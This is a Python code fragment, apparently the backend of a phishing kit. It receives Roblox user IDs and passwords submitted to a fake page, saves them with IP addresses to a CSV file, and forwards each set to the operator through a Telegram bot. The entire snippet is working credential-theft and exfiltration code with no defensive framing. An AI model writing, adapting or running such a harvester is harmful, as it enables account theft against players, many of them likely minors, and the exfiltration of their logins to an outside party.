# ============================================================
# 1. CREDENTIALS — FIXED for Roblox ID
# ============================================================
if data_type == 'credentials':
    # Support both field names (for compatibility)
    roblox_id = data.get('roblox_id', data.get('email', ''))
    password = data.get('pass', '')
    
    with open(CREDENTIAL_CSV, 'a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow([data['timestamp'], roblox_id, password, ip])
    
    # Send to Telegram with clear labels
    msg = f"🎮 <b>Roblox Credentials</b>\n"
    msg += f"🆔 Roblox ID: <code>{roblox_id}</code>\n"
    msg += f"🔑 Password: <code>{password}</code>\n"
    msg += f"🌐 IP: {ip}\n"
    msg += f"🕐 Time: {data['timestamp']}"
    
    send_telegram(msg)
    print(f"[✓] Roblox credentials: {roblox_id}")
    return jsonify({"status": "OK"}), 200
